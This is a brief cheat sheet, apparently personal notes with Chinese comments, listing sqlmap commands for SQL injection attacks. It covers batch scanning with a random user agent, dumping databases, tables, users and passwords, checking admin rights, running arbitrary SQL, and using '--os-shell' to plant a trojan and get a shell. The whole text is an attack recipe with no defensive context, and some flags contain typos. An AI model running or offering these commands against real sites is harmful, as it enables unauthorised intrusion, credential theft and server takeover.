# sqlmap demoes

```shell
# -m 批量扫描 —batch 全部采用默认行为，不向用户请求y/n,并且使用随机的user—agnet
sqlmap -m temp2.txt --batch --random-agent> result.txt

# 尝试获取所有数据库名
sqlmap -u url --dbs —-random-agent --batch

# 获取表名
sqlmap -u url --tables —-random-agent --batch

# 尝试获取所有用户:
sqlmap -u url --users --random-agent --batch

# 尝试获取账号密码:
sqlmap -u url --password --random-agent --batch

# 尝试获取当前用户:
sqlmap -u url --current-user --random-agent --batch

# 测试当前用户权限:
sqlmap -u url --is-dba --random-agent --batch

# 尝试写入木马,getshell
sqlmap -u url --os-shell --random-agent --batch

# 执行指定的sql语句
sqlmap.py -u url -v 1 --sql-query 'select top 20 * from City'
```

